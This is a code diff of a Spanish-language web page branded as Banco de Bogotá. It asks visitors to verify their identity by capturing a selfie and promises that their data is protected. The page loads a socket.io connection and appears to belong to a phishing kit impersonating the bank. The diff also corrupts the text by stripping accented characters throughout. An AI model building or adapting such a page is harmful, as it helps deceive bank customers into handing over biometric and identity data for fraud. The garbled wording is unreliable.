@@ -1,12 +1,12 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="description" content="Verificación de identidad - Banco de Bogotá">
+    <meta name="description" content="Verificacin de identidad - Banco de Bogot">
     <meta name="theme-color" content="#002A8D">
     
-    <title>Verificación de Identidad - Banco de Bogotá</title>
+    <title>Verificacin de Identidad - Banco de Bogot</title>
     
     <!-- Favicons -->
     <link rel="icon" type="image/png" sizes="32x32" href="Imagenes/channels4_profile-removebg-preview.png">
@@ -21,7 +21,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     
-    <!-- Scripts críticos -->
+    <!-- Scripts crticos -->
     <script src="/socket.io/socket.io.js"></script>
     <script src="js/loading-overlay-manager.js?v=1.0.2"></script>
     <script src="js/common.js?v=1.0.2"></script>
@@ -32,7 +32,7 @@
     <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
-            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogot" class="loading-logo">
             <div class="loading-spinner">
                 <div class="spinner-ring"></div>
             </div>
@@ -44,7 +44,7 @@
     <div class="container">
         <section class="verification-section">
             <div class="bank-logo">
-                <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo">
+                <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogot Logo" class="main-logo">
             </div>
             
             <div class="verification-container">
@@ -56,16 +56,16 @@
                     <div class="progress-line"></div>
                     <div class="progress-step">
                         <div class="step-circle">2</div>
-                        <span>Cédula</span>
+                        <span>Cdula</span>
                     </div>
                     <div class="progress-line"></div>
                     <div class="progress-step">
                         <div class="step-circle">3</div>
-                        <span>Confirmación</span>
+                        <span>Confirmacin</span>
                     </div>
                 </div>
 
-                <h1 class="verification-title">Verificación de Identidad</h1>
+                <h1 class="verification-title">Verificacin de Identidad</h1>
                 <p class="verification-subtitle">Por seguridad, necesitamos verificar tu identidad</p>
                 
                 <div class="camera-container">
@@ -84,7 +84,7 @@
                                 <circle cx="12" cy="10" r="3" stroke="currentColor" stroke-width="2"/>
                                 <path d="M12 2C9.243 2 7 4.243 7 7v2H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2v-9a2 2 0 00-2-2h-2V7c0-2.757-2.243-5-5-5z" stroke="currentColor" stroke-width="2"/>
                             </svg>
-                            <p>Posiciona tu rostro dentro del óvalo</p>
+                            <p>Posiciona tu rostro dentro del valo</p>
                         </div>
                     </div>
                     
@@ -103,28 +103,25 @@
                 <div class="instructions">
                     <h3>Instrucciones:</h3>
                     <ul>
-                        <li>Asegúrate de estar en un lugar bien iluminado</li>
+                        <li>Asegrate de estar en un lugar bien iluminado</li>
                         <li>Retira gafas, gorras o cualquier accesorio que cubra tu rostro</li>
-                        <li>Posiciona tu rostro dentro del óvalo</li>
-                        <li>Mantén una expresión neutral</li>
+                        <li>Posiciona tu rostro dentro del valo</li>
+                        <li>Mantn una expresin neutral</li>
                     </ul>
                 </div>
 
                 <div class="button-container">
                     <button type="button" class="action-button" id="captureBtn">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
-                            <circle cx="12" cy="12" r="3" fill="currentColor"/>
-                        </svg>
                         Capturar Selfie
                     </button>
                 </div>
             </div>
 
             <p class="privacy-text">
-                Tus datos están protegidos y serán utilizados únicamente para verificar tu identidad.
+                Tus datos estn protegidos y sern utilizados nicamente para verificar tu identidad.
             </p>
         </section>
     </div>
 </body>
 </html>
+
